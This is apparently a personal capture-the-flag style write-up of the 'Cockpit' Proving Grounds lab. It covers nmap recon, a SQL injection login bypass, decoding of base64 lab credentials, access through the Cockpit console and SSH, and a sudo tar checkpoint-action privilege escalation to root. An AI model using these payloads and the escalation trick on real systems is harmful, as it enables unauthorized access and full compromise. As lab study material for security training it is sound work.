---
layout: post
title:  "Write Up: Proving Grounds Practice - Cockpit"
date:   2024-07-26 21:30:31 -0400
categories: oscp proving-grounds TJNull
---


192.168.199.10
me - 192.168.45.213

==================================================================================================
dirsearch -u http://192.168.199.10 -r -o dirsearch.txt



# Nmap 7.94SVN scan initiated Fri Jul 26 19:04:42 2024 as: nmap -sV -sC -p- -oA Cockpit 192.168.199.10
Nmap scan report for 192.168.199.10
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2024-07-26T23:03:39
|_Not valid after:  2124-07-02T23:03:39
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerpri
nt at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.94SVN%T=SSL%I=7%D=7/26%Time=66A42BDD%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,E45,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX
SF:-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-C
SF:ontent-Type-Options:\x20nosniff\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>
SF:\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</ti
SF:tle>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\
SF:"text/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewpo
SF:rt\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x2
SF:0\x20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:font-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x
SF:20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:line-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20margin:\x200\x200\x2010px;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20@font-face\x20{\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,E45,"HTTP/1\.1\x20400\x20
SF:Bad\x20request\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransf
SF:er-Encoding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-P
SF:olicy:\x20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\n\r\n29\r
SF:\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nB
SF:ad\x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<meta\x20http-equiv=\
SF:"Content-Type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20\x
SF:20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20in
SF:itial-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x20{\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x20\"Ope
SF:n\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20
SF:{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x200\x2
SF:010px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20@font-face\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 26 19:08:07 2024 -- 1 IP address (1 host up) scanned in 204.92 seconds

==================================================================================================
cockpit running on 9090

https://cockpit-project.org/guide/latest/authentication


==================================================================================================
ding dong site on port 80 but has a hidden login page - http://192.168.199.10/login.php



by JDgodd | blaze.offsec (possible user name?)

check for sql injection by putting ' in user name and password fields and we have pay dirt


'OR " = '

'OR '' = '	Allows authentication without a valid username.





Username 	Password
james 	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron 	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy


                                                                                                                     
┌──(kali㉿kali)-[~/offsec/pg-practice/Cockpit]
└─$ echo -n "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d              
canttouchhhthiss@455152  


james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152


so ssh doesnt work for the above so we are going back to port 9090 to see if it works there

=======================================================================================================================
james works

```
└─$ cat ~/.ssh/id_ed25519.pub    
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjpf/mFMlaKOmHjBplkGGlRhZok63RCtb2U9jphjKmG kali@kali
                                                                                                                     
┌──(kali㉿kali)-[~/offsec/pg-practice/Cockpit]
└─$ ssh -i ~/.ssh/id_ed25519 james@192.168.199.10

```

there is a section where we can add private keys so I add on qnd now I CAN SSH IN!




james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *



SOOOOOO we just check gtfo bins and under tar it has an example so we do the following:

```
james@blaze:~$ sudo tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
local.txt
# id
uid=0(root) gid=0(root) groups=0(root)
```